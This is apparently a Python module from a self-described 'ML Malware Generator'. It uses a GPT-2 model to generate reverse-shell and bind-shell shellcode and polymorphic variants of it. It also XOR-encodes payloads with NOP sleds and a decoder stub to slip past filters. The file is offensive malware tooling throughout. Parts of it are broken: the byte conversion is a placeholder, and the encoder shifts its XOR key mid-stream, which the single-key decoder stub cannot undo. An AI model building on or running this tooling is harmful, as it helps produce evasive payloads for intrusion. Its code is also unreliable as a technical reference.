"""
ML Malware Generator - Transformer-based Shellcode Generator
Uses transformer models to generate coherent shellcode
"""
import torch
import torch.nn as nn
from transformers import GPT2LMHeadModel, GPT2Tokenizer, GPT2Config
from typing import List, Optional
import numpy as np

from config.settings import ml_config, MODELS_DIR
from utils.logger import get_logger

logger = get_logger()


class ShellcodeTransformer:
    """Transformer model for generating shellcode"""
    
    def __init__(
        self,
        model_name: str = "gpt2",
        max_length: int = None,
        device: str = None,
    ):
        self.model_name = model_name
        self.max_length = max_length or ml_config.transformer_max_length
        self.device = device or ml_config.device
        
        # Load or create model
        try:
            # Try to load pre-trained model
            self.tokenizer = GPT2Tokenizer.from_pretrained(model_name)
            self.model = GPT2LMHeadModel.from_pretrained(model_name).to(self.device)
            logger.info(f"Loaded pre-trained model: {model_name}")
        except:
            # Create new model from scratch
            config = GPT2Config(
                vocab_size=50257,
                n_positions=self.max_length,
                n_ctx=self.max_length,
                n_embd=768,
                n_layer=ml_config.transformer_num_layers,
                n_head=ml_config.transformer_num_heads,
            )
            self.model = GPT2LMHeadModel(config).to(self.device)
            self.tokenizer = GPT2Tokenizer.from_pretrained("gpt2")
            logger.info("Created new transformer model from scratch")
        
        # Set padding token
        if self.tokenizer.pad_token is None:
            self.tokenizer.pad_token = self.tokenizer.eos_token
        
        self.model.eval()
    
    def generate_shellcode(
        self,
        prompt: str = "",
        max_length: int = 256,
        temperature: float = 0.8,
        top_k: int = 50,
        top_p: float = 0.95,
        num_return_sequences: int = 1,
    ) -> List[str]:
        """
        Generate shellcode based on prompt
        
        Args:
            prompt: Starting prompt for generation
            max_length: Maximum length of generated sequence
            temperature: Sampling temperature (higher = more random)
            top_k: Top-k sampling parameter
            top_p: Nucleus sampling parameter
            num_return_sequences: Number of sequences to generate
        
        Returns:
            List of generated shellcode strings
        """
        self.model.eval()
        
        # Encode prompt
        if prompt:
            input_ids = self.tokenizer.encode(prompt, return_tensors="pt").to(self.device)
        else:
            # Start with empty prompt
            input_ids = torch.tensor([[self.tokenizer.bos_token_id]]).to(self.device)
        
        # Generate
        with torch.no_grad():
            output = self.model.generate(
                input_ids,
                max_length=max_length,
                temperature=temperature,
                top_k=top_k,
                top_p=top_p,
                num_return_sequences=num_return_sequences,
                do_sample=True,
                pad_token_id=self.tokenizer.pad_token_id,
                eos_token_id=self.tokenizer.eos_token_id,
            )
        
        # Decode generated sequences
        generated_texts = [
            self.tokenizer.decode(seq, skip_special_tokens=True)
            for seq in output
        ]
        
        return generated_texts
    
    def generate_x86_shellcode(
        self,
        architecture: str = "x86",
        payload_type: str = "reverse_shell",
        **kwargs
    ) -> str:
        """Generate architecture-specific shellcode"""
        
        # Create prompt based on architecture and payload type
        prompts = {
            "x86": {
                "reverse_shell": "; x86 reverse shell shellcode\nsection .text\nglobal _start\n_start:\n",
                "exec": "; x86 exec shellcode\nsection .text\nglobal _start\n_start:\n",
                "bind_shell": "; x86 bind shell shellcode\nsection .text\nglobal _start\n_start:\n",
            },
            "x64": {
                "reverse_shell": "; x64 reverse shell shellcode\nsection .text\nglobal _start\n_start:\n",
                "exec": "; x64 exec shellcode\nsection .text\nglobal _start\n_start:\n",
                "bind_shell": "; x64 bind shell shellcode\nsection .text\nglobal _start\n_start:\n",
            },
        }
        
        prompt = prompts.get(architecture, {}).get(payload_type, "")
        
        # Generate shellcode
        generated = self.generate_shellcode(prompt=prompt, **kwargs)
        
        return generated[0] if generated else ""
    
    def generate_polymorphic_shellcode(
        self,
        base_shellcode: str,
        num_variants: int = 5,
        **kwargs
    ) -> List[str]:
        """
        Generate polymorphic variants of shellcode
        
        Args:
            base_shellcode: Original shellcode to create variants from
            num_variants: Number of variants to generate
        
        Returns:
            List of polymorphic shellcode variants
        """
        variants = []
        
        for i in range(num_variants):
            # Use base shellcode as prompt with varying temperature
            temp = 0.7 + (i * 0.1)  # Increase temperature for more variation
            
            variant = self.generate_shellcode(
                prompt=base_shellcode[:50],  # Use first part as prompt
                temperature=temp,
                num_return_sequences=1,
                **kwargs
            )
            
            variants.extend(variant)
        
        return variants
    
    def encode_shellcode_to_bytes(self, shellcode_text: str) -> bytes:
        """
        Convert shellcode text to bytes
        (Simplified - in real implementation would parse assembly)
        """
        # This is a placeholder - real implementation would use
        # keystone-engine to assemble the shellcode
        
        # For now, just encode as bytes
        return shellcode_text.encode('utf-8')
    
    def fine_tune(
        self,
        training_data: List[str],
        epochs: int = 3,
        learning_rate: float = None,
        batch_size: int = 8,
    ):
        """
        Fine-tune the model on custom shellcode dataset
        
        Args:
            training_data: List of shellcode examples
            epochs: Number of training epochs
            learning_rate: Learning rate for fine-tuning
            batch_size: Batch size for training
        """
        lr = learning_rate or ml_config.transformer_learning_rate
        
        self.model.train()
        optimizer = torch.optim.AdamW(self.model.parameters(), lr=lr)
        
        logger.info(f"Fine-tuning transformer on {len(training_data)} samples...")
        
        for epoch in range(epochs):
            total_loss = 0
            num_batches = 0
            
            # Process in batches
            for i in range(0, len(training_data), batch_size):
                batch = training_data[i:i + batch_size]
                
                # Tokenize batch
                encodings = self.tokenizer(
                    batch,
                    return_tensors="pt",
                    padding=True,
                    truncation=True,
                    max_length=self.max_length,
                ).to(self.device)
                
                # Forward pass
                outputs = self.model(
                    input_ids=encodings['input_ids'],
                    attention_mask=encodings['attention_mask'],
                    labels=encodings['input_ids'],
                )
                
                loss = outputs.loss
                
                # Backward pass
                optimizer.zero_grad()
                loss.backward()
                optimizer.step()
                
                total_loss += loss.item()
                num_batches += 1
            
            avg_loss = total_loss / num_batches
            logger.info(f"Epoch {epoch + 1}/{epochs} - Loss: {avg_loss:.4f}")
        
        self.model.eval()
        logger.success("Fine-tuning completed")
    
    def save_model(self, path: str):
        """Save fine-tuned model"""
        save_path = MODELS_DIR / path
        save_path.mkdir(parents=True, exist_ok=True)
        
        self.model.save_pretrained(save_path)
        self.tokenizer.save_pretrained(save_path)
        
        logger.info(f"Saved transformer model to {save_path}")
    
    def load_model(self, path: str):
        """Load fine-tuned model"""
        load_path = MODELS_DIR / path
        
        self.model = GPT2LMHeadModel.from_pretrained(load_path).to(self.device)
        self.tokenizer = GPT2Tokenizer.from_pretrained(load_path)
        
        if self.tokenizer.pad_token is None:
            self.tokenizer.pad_token = self.tokenizer.eos_token
        
        self.model.eval()
        logger.info(f"Loaded transformer model from {load_path}")


class ShellcodeEncoder:
    """Encode shellcode with various techniques"""
    
    @staticmethod
    def remove_bad_bytes(shellcode: bytes, bad_bytes: List[int] = None) -> bytes:
        """Remove bad bytes from shellcode using encoding"""
        if bad_bytes is None:
            bad_bytes = [0x00, 0x0a, 0x0d]  # NULL, LF, CR
        
        # Simple XOR encoding to avoid bad bytes
        encoded = bytearray()
        xor_key = 0x01
        
        for byte in shellcode:
            while (byte ^ xor_key) in bad_bytes:
                xor_key = (xor_key + 1) % 256
            encoded.append(byte ^ xor_key)
        
        return bytes(encoded)
    
    @staticmethod
    def add_nop_sled(shellcode: bytes, sled_size: int = 16) -> bytes:
        """Add NOP sled before shellcode"""
        nop = b'\x90' * sled_size  # x86 NOP instruction
        return nop + shellcode
    
    @staticmethod
    def create_decoder_stub(encoded_shellcode: bytes, xor_key: int) -> bytes:
        """Create decoder stub for encoded shellcode"""
        # Simplified decoder stub (x86)
        # In real implementation, this would be proper assembly
        decoder = f"""
        ; Decoder stub
        xor ecx, ecx
        mov cl, {len(encoded_shellcode)}
        lea esi, [shellcode]
        decode_loop:
            xor byte [esi], {xor_key}
            inc esi
            loop decode_loop
        shellcode:
        """.encode('utf-8')
        
        return decoder + encoded_shellcode
